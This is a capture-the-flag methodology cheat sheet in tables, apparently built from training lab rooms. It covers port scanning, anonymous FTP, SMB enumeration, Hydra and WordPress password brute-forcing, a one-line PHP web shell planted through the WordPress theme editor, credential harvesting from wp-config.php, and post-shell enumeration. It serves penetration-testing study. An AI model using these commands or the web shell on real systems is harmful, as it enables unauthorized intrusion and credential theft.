
### What ports are open?

| Condition | Action |
|-----------|--------|
| **Always start with** | `nmap -sC -sV -oA scan $IP` |
| **FTP open (21)** | `ftp $IP` → login: `anonymous` — look for notes, keys, images, config files<br>*Ref: Bounty Hacker, Startup, Chillhack, Chocolate Factory, Different CTF* |
| **FTP missed on IP** | Rescan with hostname after adding to /etc/hosts — vhosts can expose different services<br>*Ref: Different CTF* |
| **SMB open (139/445)** | Enumerate users, shares, and password policy<br>`enum4linux -a $IP`<br>- Returns Unix users (SID S-1-22-1-*), shares, and password policy (min length, complexity, lockout)<br>- No lockout + short min password → bruteforce is safe<br>*Ref: Year of the Fox (found users fox + rascal, no lockout policy)* |
| **HTTP open (80/8080)** | Check robots.txt, page source, headers, fuzz dirs — tools: `gobuster`, `dirb`, `feroxbuster` |
| **HTTP Basic Auth** | If the page prompts a browser login dialog, bruteforce with Hydra's http-head module<br>`hydra -l <user> -P passwords.txt $IP http-head /`<br>*Ref: Year of the Fox (rascal:MANUEL)* |

---

### Web app found — what's running?

| Condition | Action |
|-----------|--------|
| **WordPress** | - Bruteforce: `wpbrute -u admin -w passwords.txt -target http://target/wp-login.php`<br>- RCE: Theme Editor → 404.php → `<?php system($_GET['cmd']) ?>`<br>- FTP: grab `wp-config.php` → DB creds → phpMyAdmin → check `wp_users` + `wp_options`<br>*Ref: Mr Robot, Internal, Different CTF* |
| **Known CMS / version** | Search ExploitDB for version-specific RCE<br>*Ref: Ignite, Agent T* |
| **Custom / unknown app** | Read source & comments; fuzz params with `wfuzz`, `ffuf` |
| **Default / broken page** | View page source — creds or hidden paths may be commented<br>*Ref: Pickle Rick, Madness, Wonderland* |

---

### On-box enumeration after getting a shell

| Condition | Action |
|-----------|--------|
| **Listening services** | `ss -tulpn` or `netstat -ntlp` — find services bound to localhost only (SSH, DB, internal apps)<br>*Ref: Year of the Fox (SSH on 127.0.0.1:22 only), Chillhack (port 9001)* |
| **Files owned by user** | `find /usr/bin -group <username>`<br>*Ref: Different CTF* |
| **Subdomains in /var/www** | `ls /var/www/`<br>*Ref: Different CTF, Chillhack* |

